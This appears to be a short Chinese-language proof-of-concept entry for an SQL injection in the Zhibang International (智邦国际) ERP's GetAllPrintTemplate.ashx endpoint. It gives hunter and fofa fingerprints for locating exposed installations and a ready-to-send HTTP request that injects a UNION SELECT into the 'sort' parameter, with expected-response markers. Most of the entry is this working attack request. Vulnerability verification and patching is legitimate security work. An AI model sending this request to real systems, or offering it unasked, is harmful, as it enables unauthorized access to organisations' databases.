﻿# 智邦国际-GetAllPrintTemplate-SQL注入漏洞

> 更新时间：2024-04-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：hunter:app.name="智邦国际 ERP" fofa:body="/SYSN/"

> 验证脚本：HTTP

```
GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)%2Bchar(99)%2Bchar(97)%2Bchar(109)%2Bchar(97)%2Bchar(103)%2Bchar(105)%2Bchar(99),NULL-- HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：scamagic

> 上传文件定位：

> 验证文件来源：智邦国际-GetAllPrintTemplate-SQL注入漏洞.poc

